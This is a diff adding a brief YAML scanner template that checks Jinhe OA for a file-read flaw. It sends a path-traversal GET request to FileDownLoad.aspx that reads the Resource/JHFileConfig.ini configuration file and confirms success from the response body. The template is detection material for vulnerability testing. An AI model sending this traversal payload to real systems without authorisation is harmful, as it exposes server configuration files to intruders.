@@ -1,0 +1,11 @@
+name: 金和OA-FileDownLoad-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini
+    expression:
+      status: 200
+      body_all: ["FolderTotal"]
